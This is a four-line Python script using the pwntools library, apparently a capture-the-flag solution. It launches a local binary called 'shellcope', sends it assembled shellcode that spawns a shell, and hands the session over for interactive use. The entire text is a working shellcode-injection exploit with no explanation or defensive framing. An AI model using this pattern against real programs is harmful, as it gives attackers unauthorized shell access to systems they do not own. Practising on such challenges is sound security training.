from pwn import *
p = process("./shellcope")
p.sendline(asm(shellcraft.sh()))
p.interactive()